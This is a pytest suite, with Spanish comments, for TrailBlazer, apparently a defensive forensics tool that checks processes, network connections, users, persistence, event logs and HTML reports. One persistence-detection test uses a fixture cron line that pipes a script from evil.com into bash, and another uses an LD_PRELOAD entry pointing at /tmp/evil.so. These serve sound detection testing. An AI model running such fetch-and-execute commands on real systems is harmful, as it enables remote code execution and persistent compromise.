"""
TrailBlazer - Test Suite
Pruebas unitarias para los módulos collectors y reporters.
"""

import sys
import os
import platform
from pathlib import Path
from unittest.mock import patch, MagicMock

# Añadir raíz del proyecto al path
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import pytest

# ─────────────────────────────────────────────────────────────────────────────
# core/config
# ─────────────────────────────────────────────────────────────────────────────

class TestConfig:
    def test_constants_exist(self):
        from core.config import (
            TOOL_NAME, TOOL_VERSION, PLATFORM,
            WIN_EVENT_IDS, SENSITIVE_PORTS, RISK_WEIGHTS
        )
        assert TOOL_NAME == "TrailBlazer"
        assert TOOL_VERSION == "1.0.0"
        assert PLATFORM in ("Windows", "Linux", "Darwin")

    def test_risk_weights_valid(self):
        from core.config import RISK_WEIGHTS
        for key in ("critical", "high", "medium", "low", "info"):
            assert key in RISK_WEIGHTS
            assert isinstance(RISK_WEIGHTS[key], int)
            assert RISK_WEIGHTS[key] >= 0

    def test_sensitive_ports_are_ints(self):
        from core.config import SENSITIVE_PORTS
        for port, name in SENSITIVE_PORTS.items():
            assert isinstance(port, int), f"Puerto {port} no es int"
            assert isinstance(name, str), f"Nombre {name} no es str"
            assert 0 < port < 65536

    def test_timeframe_seconds(self):
        from core.config import TIMEFRAME_SECONDS
        assert "24h" in TIMEFRAME_SECONDS
        assert TIMEFRAME_SECONDS["24h"] == 86400
        assert TIMEFRAME_SECONDS["7d"] == 604800


# ─────────────────────────────────────────────────────────────────────────────
# collectors/processes
# ─────────────────────────────────────────────────────────────────────────────

class TestProcessCollector:
    def test_collect_returns_dict(self):
        from collectors.processes import collect
        result = collect()
        assert isinstance(result, dict)
        assert result["module"] == "processes"

    def test_collect_has_required_keys(self):
        from collectors.processes import collect
        result = collect()
        for key in ("module", "findings", "summary", "risk_score"):
            assert key in result, f"Falta key: {key}"

    def test_findings_are_list(self):
        from collectors.processes import collect
        result = collect()
        assert isinstance(result["findings"], list)

    def test_risk_score_non_negative(self):
        from collectors.processes import collect
        result = collect()
        assert result["risk_score"] >= 0

    def test_finding_structure(self):
        """Cada finding debe tener severity, description y category."""
        from collectors.processes import collect
        result = collect()
        for finding in result["findings"]:
            assert "severity" in finding
            assert "description" in finding
            assert "category" in finding
            assert finding["severity"] in ("critical", "high", "medium", "low", "info")

    def test_is_local_helper(self):
        from collectors.processes import _is_local
        assert _is_local("127.0.0.1") is True
        assert _is_local("10.0.0.1") is True
        assert _is_local("192.168.1.1") is True
        assert _is_local("8.8.8.8") is False
        assert _is_local("185.220.101.1") is False


# ─────────────────────────────────────────────────────────────────────────────
# collectors/network
# ─────────────────────────────────────────────────────────────────────────────

class TestNetworkCollector:
    def test_collect_returns_dict(self):
        from collectors.network import collect
        result = collect()
        assert isinstance(result, dict)
        assert result["module"] == "network"

    def test_collect_has_required_keys(self):
        from collectors.network import collect
        result = collect()
        for key in ("module", "findings", "summary", "risk_score"):
            assert key in result

    def test_summary_has_connection_counts(self):
        from collectors.network import collect
        result = collect()
        s = result["summary"]
        assert "total_connections" in s
        assert "listening_ports" in s
        assert "external_connections" in s

    def test_is_local_helper(self):
        from collectors.network import _is_local
        assert _is_local("127.0.0.1") is True
        assert _is_local("0.0.0.0") is True
        assert _is_local("10.10.10.10") is True
        assert _is_local("1.1.1.1") is False

    def test_findings_severity_valid(self):
        from collectors.network import collect
        result = collect()
        valid = {"critical", "high", "medium", "low", "info"}
        for f in result["findings"]:
            assert f["severity"] in valid


# ─────────────────────────────────────────────────────────────────────────────
# collectors/users
# ─────────────────────────────────────────────────────────────────────────────

class TestUserCollector:
    def test_collect_returns_dict(self):
        from collectors.users import collect
        result = collect()
        assert isinstance(result, dict)
        assert result["module"] == "users"

    def test_current_user_present(self):
        from collectors.users import collect
        result = collect()
        assert "current_user" in result
        cu = result["current_user"]
        assert "username" in cu
        assert "is_admin" in cu
        assert isinstance(cu["is_admin"], bool)

    def test_summary_has_user_info(self):
        from collectors.users import collect
        result = collect()
        s = result["summary"]
        assert "current_user" in s
        assert "is_admin" in s
        assert "active_sessions" in s

    def test_sessions_are_list(self):
        from collectors.users import collect
        result = collect()
        assert isinstance(result.get("sessions", []), list)


# ─────────────────────────────────────────────────────────────────────────────
# collectors/persistence
# ─────────────────────────────────────────────────────────────────────────────

class TestPersistenceCollector:
    def test_collect_returns_dict(self):
        from collectors.persistence import collect
        result = collect()
        assert isinstance(result, dict)
        assert result["module"] == "persistence"

    def test_persistence_items_are_list(self):
        from collectors.persistence import collect
        result = collect()
        assert isinstance(result.get("persistence_items", []), list)

    def test_risk_score_non_negative(self):
        from collectors.persistence import collect
        result = collect()
        assert result["risk_score"] >= 0

    def test_analyze_detects_suspicious_content(self):
        from collectors.persistence import _analyze
        items = [
            {
                "type": "cron",
                "source": "/etc/cron.d/backdoor",
                "content": "curl http://evil.com/shell.sh | bash",
            }
        ]
        findings = _analyze(items)
        assert len(findings) > 0
        assert any(f["severity"] in ("critical", "high") for f in findings)

    def test_analyze_detects_ld_preload(self):
        from collectors.persistence import _analyze
        items = [
            {
                "type": "init_script",
                "source": "/etc/ld.so.preload",
                "content": "/tmp/evil.so",
            }
        ]
        findings = _analyze(items)
        assert any("preload" in f["description"].lower() for f in findings)


# ─────────────────────────────────────────────────────────────────────────────
# collectors/eventlogs
# ─────────────────────────────────────────────────────────────────────────────

class TestEventLogCollector:
    def test_collect_returns_dict(self):
        from collectors.eventlogs import collect
        result = collect(timeframe="1h")
        assert isinstance(result, dict)
        assert result["module"] == "eventlogs"

    def test_timeframe_stored(self):
        from collectors.eventlogs import collect
        result = collect(timeframe="6h")
        assert result["timeframe"] == "6h"

    def test_summary_structure(self):
        from collectors.eventlogs import collect
        result = collect(timeframe="1h")
        s = result["summary"]
        assert "total_events" in s
        assert "findings_count" in s

    def test_analyze_detects_brute_force(self):
        from collectors.eventlogs import _analyze
        # Simular 10 failed logins del mismo usuario
        events = [
            {"eid": 4625, "user": "admin", "type": "raw", "description": ""}
            for _ in range(10)
        ]
        findings = _analyze(events)
        bf = [f for f in findings if f["category"] == "BruteForce"]
        assert len(bf) > 0
        assert bf[0]["count"] == 10

    def test_analyze_detects_log_cleared(self):
        from collectors.eventlogs import _analyze
        events = [{"eid": 1102, "type": "raw", "description": "Audit log cleared"}]
        findings = _analyze(events)
        anti = [f for f in findings if f["category"] == "AntiForensics"]
        assert len(anti) > 0

    def test_analyze_detects_new_user(self):
        from collectors.eventlogs import _analyze
        events = [{"eid": 4720, "user": "backdoor", "type": "raw", "description": ""}]
        findings = _analyze(events)
        acc = [f for f in findings if f["category"] == "Accounts"]
        assert len(acc) > 0


# ─────────────────────────────────────────────────────────────────────────────
# reporters/html_reporter
# ─────────────────────────────────────────────────────────────────────────────

class TestHTMLReporter:
    def test_generate_creates_file(self, tmp_path):
        from reporters.html_reporter import generate
        out = str(tmp_path / "test_report.html")
        findings = [
            {
                "severity": "high",
                "description": "Test finding",
                "category": "Test",
                "_module": "test",
            }
        ]
        # Simular módulo con finding
        module_results = [
            {"module": "test", "findings": findings,
             "summary": {"total_processes": 10, "findings_count": 1}, "risk_score": 15}
        ]
        result_path = generate(module_results, total_risk=15,
                               timeframe="24h", output_path=out)
        assert Path(result_path).exists()
        content = Path(result_path).read_text(encoding="utf-8")
        assert "TrailBlazer" in content
        assert "Test finding" in content

    def test_html_contains_opsec_score(self, tmp_path):
        from reporters.html_reporter import generate
        out = str(tmp_path / "score_test.html")
        generate([], total_risk=0, output_path=out)
        content = Path(out).read_text(encoding="utf-8")
        assert "OPSEC" in content

    def test_esc_function(self):
        from reporters.html_reporter import _esc
        assert _esc("<script>") == "&lt;script&gt;"
        assert _esc('"hello"') == "&quot;hello&quot;"
        assert _esc("&amp;") == "&amp;amp;"
